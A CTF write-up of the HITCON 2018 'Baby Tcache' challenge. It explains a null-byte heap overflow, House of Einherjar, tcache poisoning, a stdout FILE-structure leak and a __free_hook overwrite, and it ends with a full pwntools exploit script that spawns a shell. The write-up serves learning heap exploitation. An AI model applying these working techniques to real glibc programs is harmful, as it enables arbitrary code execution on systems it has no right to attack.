---
title: BabyTcache - HITCON CTF 2018
date: 2019-01-14 13:00:00
categories:
  - Pwn
  - linux
  - heap
tags:
  - CTF
  - Writeup
  - Pwn
---

Linux GLIBC Heap Exploitation of a null-byte overflow
<!-- excerpt -->

```bash
$$$$$$$$$$$$$$$$$$$$$$$$$$$
🍊      Baby Tcache      🍊
$$$$$$$$$$$$$$$$$$$$$$$$$$$
$   1. New heap           $
$   2. Delete heap        $
$   3. Exit               $
$$$$$$$$$$$$$$$$$$$$$$$$$$$
Your choice: $
```
There are two functionalities, create a new chunk and free chunk created. The chunks created are stored as an array in bss. You can create 10 chunks at max.

### Mitigations
```bash
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : ENABLED
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```

### The vulnerability
There is a **null byte overflow** when you create a new chunk.

```c++
// IDA decompilation
printf("Size:");
size = get_int();
if ( size > 0x2000 )
	exit(-2);
ptr = malloc(size);
if ( !ptr )
	exit(-1);
printf("Data:");
get_inp(ptr, size);
ptr[size] = 0;    // null byte overflow
arr[i] = ptr;
v0 = sizes;
sizes[i] = size;
return v0;
```
If the size of the chunk to be allocated is given as 0x108, ptr[0x108] will overwrite the last byte of the size of the next chunk.

### Exploit

#### Getting UAF on a tcache chunk, that already has a libc pointer to do a partial overwrite.
We use House of Einhejar techniques for this part of the exploit a get a chunk such that it is present in the tcache bin and the unsorted bin. 

With tcache enabled in glibc 2.27, all chunks of size < 0x410 are put into tcache bins for performance improvements. These are some things to note about tcache chunks:
* There is a tcache bin for each size which can hold 7 chunks in a singly linked list. Furthur freed chunks are put into fastbins as done in the previous glibc versions.
* Tcache chunks, like fastbin chunks are not merged with previously freed chunks when the prev\_inuse bit is clear. 
* There are no security checks done when a chunk is allocated from the tcache bin. Chunks get allocated from a particular bin if the size field is wrong or even if null.

Keeping all these things in mind let's move on.
I allocated a few chunks in the below manner. Each allocation has it purpose. 

```
      +------------------------------------------------------------+
      | 0x555555757250:	0x0000000000000000	0x0000000000000501 |
ptr_0 + 0x555555757260:	0x6161616161616161	0x0000000000000000 +---> To be merged with ptr_4 
      | 0x555555757270:	0x0000000000000000	0x0000000000000000 |
      +------------------------------------------------------------+
      | 0x555555757750:	0x0000000000000000	0x0000000000000071 |
ptr_1 + 0x555555757760:	0x6262626262626262	0x0000000000000000 +---> UAF after House of Einhejar
      | 0x555555757770:	0x0000000000000000	0x0000000000000000 |
      +------------------------------------------------------------+
      | 0x5555557577c0:	0x0000000000000000	0x0000000000000041 |
ptr_2 + 0x5555557577d0:	0x6161616161616161	0x0000000000000000 +---> Intermediate chunk to get 2 UAFs
      | 0x5555557577e0:	0x0000000000000000	0x0000000000000000 |
      +------------------------------------------------------------+
      | 0x555555757800:	0x0000000000000000	0x0000000000000021 |
ptr_3|  0x555555757810:	0x6161616161616161	0x0000000000000000 +---> Overwrite ptr_4->size 
      | 0x555555757820:	0x0000000000000000	0x0000000000000501 |
      +------------------------------------------------------------+
      | 0x555555757820:	0x0000000000000000	0x0000000000000501 |
ptr_4 + 0x555555757830:	0x6262626262626262	0x0000000000000000 +---> Einhejar on this chunk
      | 0x555555757840:	0x0000000000000000	0x0000000000000000 |
      +------------------------------------------------------------+
      | 0x555555757d20:	0x0000000000000000	0x0000000000000021 |
ptr_5 + 0x555555757d30:	0x6161616161616161	0x0000000000000000 +---> Prevent merge with top chunk
      | 0x555555757d40:	0x0000000000000000	0x00000000000202e1 |
      +------------------------------------------------------------+
```
Note that we clear the prev\_inuse bit of next chunk only when the size is a multiple of 0x8. 
First step is to free and allocate the `ptr_3` chunk to clear the prev\_inuse bit and set the prev\_size of the `ptr_4` chunk.

```bash
      +------------------------------------------------------------+
      | 0x555555757800:	0x0000000000000000	0x0000000000000021 |
ptr_3 + 0x555555757810:	0x6161616161616161	0x0000000000000000 +---> Used to overwrite the ptr_4->size
      | 0x555555757820:	0x0000000000000000	0x0000000000000501 |
      +------------------------------------------------------------+
      | 0x555555757820:	0x00000000000005d0	0x0000000000000500 |
ptr_4 + 0x555555757830:	0x6262626262626262	0x0000000000000000 +---> ptr_4 - ptr_4->prev_size = ptr_1
      | 0x555555757840:	0x0000000000000000	0x0000000000000000 |
      +------------------------------------------------------------+
```
* Free `ptr_0`, this chunk will now be in the unsorted bin.
* Free `ptr_4`, since the prev\_inuse bit is clear, it will refer to the prev\_size and merge with that chunk. 
* Now `ptr_0` is an unsorted bin chunk of 0xad1 size and overlaps `ptr_1`, `ptr_2` and `ptr_3`.

```bash
      +------------------------------------------------------------+
      | 0x555555757250:	0x0000000000000000	0x0000000000000ad1 |
ptr_0 + 0x555555757260:	0x6161616161616161	0x0000000000000000 +---> After house of einhejar
      | 0x555555757270:	0x0000000000000000	0x0000000000000000 |
      +------------------------------------------------------------+
```
* Free `ptr_1` and `ptr_3`, puting them in the tcache bin.
* Allocate 0x4f0, this allocation will be made off unsorted bin. Now `ptr_1` is in tcache and in unsorted bin.

```bash
      +------------------------------------------------------------+
      | 0x555555757250:	0x0000000000000000	0x0000000000000501 |
ptr_0 + 0x555555757260:	0x6161616161616161	0x0000000000000000 +---> Sliced from unsorted bin 
      | 0x555555757270:	0x0000000000000000	0x0000000000000000 |
      +------------------------------------------------------------+
      | 0x555555757750:	0x0000000000000500	0x00000000000005b1 |
ptr_1 + 0x555555757760:	0x00007ffff7dcfca0	0x00007ffff7dcfca0 +---> In tcache and unsorted bin
      | 0x555555757770:	0x0000000000000000	0x0000000000000000 |
      +------------------------------------------------------------+
```
* Allocate a chunk of 0x90, which will be sliced from the unsorted bin. The same pointer is in the tcache as a 0x70 chunk.
* Write to the 0x90 chunk to overwrite the fd of `ptr_1` to corrupt the tcache bin. 
* Allocate 0x60 twice to get the 0x70 chunks from the tcache, the second chunk will be the arbitary chunk.

With all mitigations enabled, there is nothing we can do other than partially overwrite the libc address. The last three nibbles in libc address is constant. ASLR randomizes the next three nibbles from the last.
During the CTF we solved this challenge by doing a 16 bit bruteforce to allocate `__free_hook` and overwrite it with `one_gadget` to get shell.

The indented solution involed a very interesting file structure exploitation technique to get libc leak. [sherl0ck](https://twitter.com/sherl0ck__) has already made a detailed [writeup](https://vigneshsrao.github.io/babytcache/) on the technique.
It involved overwriting the `stdout->_flags` and partially overwriting the `_IO_write_base`. 

Buffering is enabled in the binary using setvbuf(), The idea is to partially overwrite `_IO_write_base` so that and we get a leak. The most important part is knowing how `stdout->_flags` is to be set. Simply overwriting the `_IO_write_base` results in a segmentation fault. puts() calls `_IO_new_file_xsputn (FILE *f, const void *data, size_t n)` which basically checks how much space is left in the buffer and then calls `new_do_write (f, s, do_write)` where `s` is data and `do_write` is the size. Then `_IO_SYSWRITE (fp, data, to_do);` is called which is more like `write(stdout,stdout->_IO_write_base,size)`. There are a number of checks with `_flags` in the program flow that needs to be passed for successful leaking.

`stdout->_flags` is mainly divided into two parts, `0xfbad` the magic number occupies higher 16 bits and other 16 bits are the flags, to know more look at the [libio.h](https://github.com/lattera/glibc/blob/master/libio/libio.h).
We have to clear `_IO_NO_WRITES`, if set, writing is not allowed and results in an EOF error. `_IO_CURRENTLY_PUTTING` and `_IO_IS_APPENDING` have to be set to avoid any furthur issues within puts(). To know more refer [sherl0ck's writeup](https://vigneshsrao.github.io/babytcache/).

Partially overwrite last two bytes of unsorted bin libc address with `stdout`. Set `stdout->_flags` as `0xfbad1800` and partially overwrite the `stdout->_IO_write_base` to a lower address such that libc addresses are flushed out. There is a 4-bit bruteforce involved to land the `stdout` address. 

After getting the leak you just have to corrupt tcache again and overwrite `__free_hook` with `one\_gadget`. For this we apply the same technique for UAF on `ptr_2` by allocated a chunk off the unsorted bin.

### Here is my exploit code
```python
from pwn import *

s=process("./baby_tcache",env={'LD_PRELOAD' : './libc.so.6'})
libc = ELF("./libc.so.6")
#s=remote("52.68.236.186", 56746)

def add(size,data,val=1):
        s.recvuntil("Your choice: ")
        s.sendline(str(1))
        s.recvuntil("Size:")
        s.sendline(str(size))
        ret = s.recvuntil("Data:",timeout=5)
        if ret == "":
            exit()
        if(val):
            s.sendline(str(data))
        else:
            s.send(str(data))

def free(idx):
        s.recvuntil("Your choice: ")
        s.sendline(str(2))
        s.recvuntil("Index:")
        s.sendline(str(idx))

# House of einhejar
add(0x4f0,"a"*0x8,1)
add(0x60,"b"*8)
add(0x30,"a"*8)
add(0x10,"a"*8)
add(0x4f0,"b"*8,0)
add(0x10,"a"*8)

# free and allocate ptr_3 to overwrite prev_size and clear prev\_inuse bit of ptr_4
free(3)
add(0x18,p64(0x00) *2 + p64(0x5d0),0)

# trigger house of einhejar
free(0)
free(4)

# free two ptr_1 and ptr_3 so they can be used to corrupt tcache and get arbitary allocations
free(1)
free(3)

# allocate ptr_1 to get UAF on ptr_1
add(0x4f0,"a")

# partial overwrite to stdout->_flags
add(0x90,"\x60\x07",0)

# Overwrite _flags and _IO_write_base to get leak
add(0x60,"w")
add(0x60,p64(0xfbad1800) + p64(0x00)*3 + "\x00",1)
libc_leak=u64(s.recv(6)+"\x00\x00")-0x3ebff0
log.info(hex(libc_leak))
free_hook=libc_leak + libc.symbols['__free_hook']
system=libc_leak + libc.symbols['system']
one_gadget = libc_leak+0x4f322

# Allocate another size such that it is serviced from the unsorted bin to get UAF on ptr_3
# Corrupt fd with __free_hook, allocate and overwrite with one_gadget
add(0x400,p64(0x00)*2 +p64(free_hook))
add(0x10,"a")
add(0x10,p64(one_gadget),1)
free(0)

s.interactive()
```
